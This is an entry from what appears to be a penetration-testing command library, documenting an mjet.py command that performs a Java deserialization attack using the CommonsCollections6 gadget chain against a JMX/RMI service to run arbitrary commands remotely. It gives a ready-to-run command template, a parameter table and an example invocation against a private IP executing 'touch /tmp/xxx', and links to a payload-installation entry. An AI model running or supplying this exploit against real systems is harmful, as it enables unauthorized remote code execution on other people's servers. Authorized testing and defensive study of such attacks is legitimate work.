---
id: 1bfa199f-fb37-4883-b019-06cadbbbe8ba
name: mjet-deserialize-commonscollections6-for-rce
type: command
executor: bash
data: >-
  jython mjet.py --jmxrole $_JMX_ROLE --jmxpassword $_JMX_PASSWORD $_TARGET_IP
  $_TARGET_PORT deserialize CommonsCollections6 "$_INITIAL_COMMAND"
output: null
created_at: '2023-04-06T03:56:00.890912+00:00'
updated_at: '2023-04-06T03:56:00.909227+00:00'
platforms:
  - Linux
tags:
  - exploitation
  - deserialization
  - rmi
verified: true
validated: true
---

# mjet-deserialize-commonscollections6-for-rce

## Command

```bash
jython mjet.py --jmxrole $_JMX_ROLE --jmxpassword $_JMX_PASSWORD $_TARGET_IP $_TARGET_PORT deserialize CommonsCollections6 "$_INITIAL_COMMAND"
```

## Description

Performs a deserialization attack using CommonsCollections6 gadget via mjet.py to execute an initial command on the target's RMI/JMX service.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --jmxrole | JMX role/ username | Yes |
| --jmxpassword | JMX password | Yes |
| $_TARGET_IP | Target IP | Yes |
| $_TARGET_PORT | RMI/JMX port | Yes |
| deserialize | Action for deserialization | Yes |
| CommonsCollections6 | Gadget chain name | Yes |
| $_INITIAL_COMMAND | Command to execute (e.g., "touch /tmp/xxx") | Yes |

## Examples

### Basic Usage

```bash
jython mjet.py --jmxrole admin --jmxpassword adminpassword 192.168.1.100 1099 deserialize CommonsCollections6 "touch /tmp/xxx"
```

## Expected Output

No direct output, but command executes silently; verify by checking if /tmp/xxx exists on target.

## Related

- [[procedures/Exploit-Java-RMI-for-RCE-Using-Sjet-or-Mjet]]
- [[commands/mjet-install-super-secret-payload-on-target]]
